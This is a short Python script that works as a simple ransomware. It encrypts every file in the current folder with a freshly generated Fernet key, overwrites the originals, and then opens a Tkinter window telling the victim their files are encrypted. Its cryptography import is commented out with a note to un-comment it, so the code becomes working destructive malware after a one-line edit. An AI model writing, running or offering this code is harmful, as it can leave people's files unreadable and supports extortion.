import os
#un-comment line 3 if you want this to run
#from cyptography.fernet import Fernet
from tkinter import *

#find files


files = []
def main():
    for file in os.listdir():
        if file == "bigballs.py" or file=="thekey.key"or file=="smallballs.py":
            continue
        if os.path.isfile(file):
            files.append(file)
        
    key = Fernet.generate_key()
    with open("thekey.key", "wb") as thekey:
        thekey.write(key)
    
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
    root = Tk()
    root.geometry("512x512")
    T=Text(root, height = 10, width=104)
    l = Label(root, text="all of ur files are encrypted, loser. gl getting them back.")
    l.pack()
    T.pack()
    root.mainloop()

if __name__ == '__main__':
    main()
